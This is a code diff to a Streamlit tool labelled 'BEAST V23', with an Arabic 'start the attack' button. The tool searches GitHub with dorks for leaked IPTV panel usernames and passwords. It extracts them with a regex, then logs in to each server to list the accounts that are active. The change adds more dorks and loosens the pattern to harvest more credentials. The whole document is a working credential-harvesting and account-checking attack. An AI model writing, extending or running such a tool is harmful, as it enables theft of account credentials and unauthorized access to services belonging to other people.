@@ -40,7 +40,7 @@ with st.sidebar:
     st.title("⚡ BEAST V23")
     token = st.text_input("GitHub Token:", type="password")
     start = st.button("🚀 ابدأ الهجوم المباشر")
-    st.info("النتائج ستظهر تحت بعضها فوراً أثناء الفحص")
+    st.info("تم توسيع نطاق البحث لنتائج ضخمة. النتائج ستظهر فوراً.")
 
 # مناطق العرض الحية
 st.subheader("📡 الرادار المباشر (الفحص الحالي)")
@@ -52,41 +52,49 @@ hits_area = st.container() # هنا تنزل السيرفرات الشغالة �
 # المحرك الرئيسي
 if start and token:
     headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
-    dorks = ['extension:txt "get.php?username=" "password="', 'extension:m3u "player_api.php"']
     
-    # قائمة لتخزين النتائج في الجلسة الحالية فقط للعرض السريع
+    # توسيع الدروكات لجلب ملفات أكثر
+    dorks = [
+        'extension:txt "get.php?username=" "password="', 
+        'extension:m3u "player_api.php"',
+        'extension:php "panel_api.php" username password',
+        '"http://" "username=" "password=" "port" extension:txt',
+        'extension:json "server_url" "username"',
+        'extension:m3u8 "username=" "password="'
+    ]
+    
     found_count = 0
     
     for dork in dorks:
-        for page in range(1, 100):
+        # ضبط الصفحات على 20 (أقصى حد يسمح به جيت هاب للبحث الواحد هو 1000 نتيجة = 20 * 50)
+        for page in range(1, 21):
             try:
-                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
+                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
                 res = requests.get(search_url, headers=headers).json()
                 
                 if "items" not in res:
-                    radar_area.warning("Rate Limit! Waiting...")
-                    time.sleep(10)
+                    radar_area.warning("Rate Limit or end of pages! Waiting 15s...")
+                    time.sleep(15)
                     continue
 
                 for item in res['items']:
                     raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                     content = requests.get(raw_url, timeout=3).text
-                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                    
+                    # الفلتر المحدث: أصبح يقبل السيرفرات بدون بورت ليضاعف لك النتائج بشكل كبير جداً
+                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                     
                     for m in matches:
                         host, user, pw = m[0], m[1], m[2]
                         
-                        # عرض السيرفر اللي بيتفحص "الآن" ديركت
                         radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host} | {user}</p>", unsafe_allow_html=True)
                         
                         try:
-                            # فحص السيرفر
                             check_url = f"{host}/player_api.php?username={user}&password={pw}"
                             r = requests.get(check_url, timeout=2).json()
                             
                             if r.get("user_info", {}).get("status") == "Active":
                                 found_count += 1
-                                # إضافة النتيجة "تحت بعضها" في الصفحة فوراً
                                 with hits_area:
                                     st.markdown(f"""
                                     <div class="active-hit">
